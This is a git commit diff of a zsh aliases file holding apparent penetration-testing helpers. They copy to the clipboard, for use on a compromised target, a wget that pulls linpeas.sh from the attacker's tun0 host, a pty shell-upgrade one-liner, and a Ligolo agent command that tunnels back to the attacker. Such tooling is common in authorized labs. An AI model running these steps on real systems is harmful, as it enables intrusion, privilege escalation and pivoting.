fc162495d1be311603b1c11bc4afac789aa222cc
jpg <163206473+jpgjpgjpgjpg@users.noreply.github.com>
2025-04-25 12:31:44 -0300

    Update aliases.zsh

--- aliases.zsh
+++ aliases.zsh
@@ -6,7 +6,7 @@ ips() {
 linpeas() {
   ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
 
-  echo "Run the following command on the target machine: wget http://$ip_tun0/linpeas.sh"
+  echo "wget http://$ip_tun0/linpeas.sh" | tr -d '\n' |xclip -sel clip
   cd ~/; python3 -m http.server 80
 }
 
@@ -14,16 +14,22 @@ upgrade () {
   echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
 }
 
-set_target() {
-  echo "$1" > ~/.config/bin/target && export IP=$1
+set_target(){
+  echo "$1" > ~/.config/bin/target && export IP=$1;
 }
 
 transfer(){
-  sudo python3 -m http.server 80 --directory ~/tools; echo "wget http://$ip_tun0/" | tr -d '\n' | xclip -sel clip
+  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
+  sudo python3 -m http.server 80 --directory ~/tools
+  echo "wget http://$ip_tun0/" | tr -d '\n' | xclip -sel clip
 }
 
 ligolo(){
-  sudo ip tuntap add user kali mode tun ligolo;sudo ip link set ligolo up;cd ~/Ligolo;sudo ./proxy -selfcert; echo "./agent -connect 172.23.10.109:11601 -ignore-cert" | tr -d '\n' | xclip -sel clip 
+  ip_tun0=$(ip a show tun0 | awk '/inet / { split($2, a, "/"); print a[1] }')
+  sudo ip tuntap add user kali mode tun ligolo
+  sudo ip link set ligolo up
+  echo "./agent -connect $ip_tun0:11601 -ignore-cert" | tr -d '\n' | xclip -sel clip
+  cd ~/Ligolo;sudo ./proxy -selfcert
 }
 
 alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
